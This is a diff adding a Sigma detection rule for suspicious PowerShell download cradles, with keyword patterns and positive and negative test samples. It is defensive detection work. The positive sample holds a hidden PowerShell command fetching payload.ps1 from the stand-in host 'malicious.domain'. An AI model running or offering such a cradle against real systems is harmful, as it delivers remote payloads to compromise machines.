@@ -1,0 +1,48 @@
+title: Suspicious PowerShell Download Cradle
+id: 3b6ab547-8ec2-4991-bc65-0a4c152b08ca
+status: production
+description: Detects suspicious PowerShell commands executing web download cradles (DownloadString, DownloadFile) to fetch remote payloads.
+author: SOC Detection Engineering Team
+date: 2024/01/15
+modified: 2026/01/10
+license: Apache-2.0
+references:
+    - https://attack.mitre.org/techniques/T1059/001/
+    - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_proc:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_cmd:
+        CommandLine|contains:
+            - 'DownloadString'
+            - 'DownloadFile'
+            - 'Net.WebClient'
+            - 'Invoke-WebRequest'
+    condition: selection_proc and selection_cmd
+falsepositives:
+    - Legitimate administrative software deployment scripts.
+level: high
+fields:
+    - Image
+    - CommandLine
+    - User
+    - ComputerName
+test_samples:
+    positive:
+        - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          CommandLine: 'powershell.exe -nop -w hidden -c "(New-Object Net.WebClient).DownloadString(\"http://malicious.domain/payload.ps1\")"'
+          User: 'SYSTEM'
+          ComputerName: 'SRV-DC01'
+    negative:
+        - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+          CommandLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\backup.ps1'
+          User: 'Admin'
+          ComputerName: 'SRV-DC01'
